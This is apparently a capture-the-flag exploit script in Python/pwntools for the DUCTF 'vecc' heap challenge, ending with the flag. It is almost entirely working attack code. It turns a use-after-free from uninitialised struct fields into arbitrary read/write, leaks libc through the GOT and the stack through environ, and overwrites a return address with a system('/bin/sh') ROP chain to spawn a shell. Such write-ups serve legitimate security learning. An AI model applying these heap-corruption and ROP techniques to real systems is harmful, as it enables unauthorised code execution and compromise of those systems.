"""
Binary allocates vecc structs on the heap, but doesn't null out the fields before hand.
We turn this use after free into an arbitrary read/write by allocating another vecc,
which ends up re-using the freed chunk that we now have a pointer to. This lets us
essentially puppet this new vecc, by overwritting it's data pointer and size field.

We use this R/W primitive to leak libc out of the GOT, then the stack from the environ
pointer. Finally, write a system("/bin/sh") ROP chain directly over the return address
"""
from pwn import *

binary_path = "./vecc"

#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

contextwatch execute "vis"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="35%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.duc.tf 30007
        return remote("chal.duc.tf", 30007)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io):
    if args.GDB:
        print("*** BREAKPOINT ***")
        io.interactive()


def create_vecc(index):
    io.sendline("1")
    io.recvuntil("> ")

    io.sendline(f"{index}")
    io.recvuntil("> ")

    return index


def destroy_vecc(index):
    io.sendline("2")
    io.recvuntil("> ")

    io.sendline(f"{index}")
    io.recvuntil("> ")


def append_vecc(index, data, clean=True):
    io.sendline("3")
    io.recvuntil("> ")

    io.sendline(f"{index}")
    io.recvuntil("> ")

    io.sendline(f"{len(data)}")
    io.sendline(data)

    if clean:
        io.recvuntil("> ")
        io.recvuntil("> ")


def clear_vecc(index):
    io.sendline("4")
    io.recvuntil("> ")

    io.sendline(f"{index}")
    io.recvuntil("> ")
    io.clean()


def show_vecc(index):
    io.sendline("5")
    io.recvuntil("> ")
    io.clean()

    io.sendline(f"{index}")
    output = io.recvuntil("\n0: exit", drop=True)

    io.recvuntil("> ")

    return output


def read(puppeteer, puppet, addr, size):
    # Arbitrary read by setting data pointer and size on vecc struct, then viewing the
    # struct.
    clear_vecc(puppeteer)
    append_vecc(puppeteer, p64(addr) + p32(size))
    return show_vecc(puppet)


def write(puppeteer, puppet, addr, data, clean=True):
    # Arbitrary write by setting data pointer and size on vecc struct, then appending
    # data. We also set the capacity to MAX_INT, to avoid reallocs
    clear_vecc(puppeteer)
    append_vecc(puppeteer, p64(addr) + p32(0) + p32(0xffffffff))
    append_vecc(puppet, data, clean=clean)


io = start()

io.recvuntil("> ")

# Allocate a new vecc, add some data (which allocates a new chunk), and free them both
A = create_vecc(0)
append_vecc(A, "12345678")
destroy_vecc(A)

# Binary doesn't zero data before use, and since the data pointer of the vecc struct
# overlaps with the fd pointer of the chunk struct, We now have a vec with a pointer to
# a freed 0x20 chunk
A = create_vecc(0)

# Allocate a new vecc struct. This is served out of the 0x20 tcache bin, and uses the 
# chunk we have a pointer to in A. This lets us control the fields of the B vecc
# directly by editing A
B = create_vecc(1)

# Leak libc out of GOT (binary is not PIE. Otherwise, free chunk into unsortedbin and
# leak from there)
puts_addr = u64(read(A, B, elf.got.puts, 8))
libc.address = puts_addr - libc.sym.puts
print(f"LIBC: {hex(libc.address)}")

# Leak stack from environ pointer
environ = u64(read(A, B, libc.sym.environ, 8))
print(f"ENVIRON: {hex(environ)}")

# Return address of the append function on the stack
VECC_APPEND_RET_OFFSET = 0x160
vecc_append_ret_addr = environ - VECC_APPEND_RET_OFFSET

# Construct ROP chain
binsh_addr = next(libc.search(b"/bin/sh\0"))

RET = 0x00000000004006e6

rop = ROP(libc)
rop.raw(RET) # stack alignment padding
rop.system(binsh_addr)
rop.exit()

# Write ROP chain
write(A, B, vecc_append_ret_addr, rop.chain(), clean=False)

io.interactive()

# DUCTF{h@v_2_z3r0_ur_all0ca710n5}
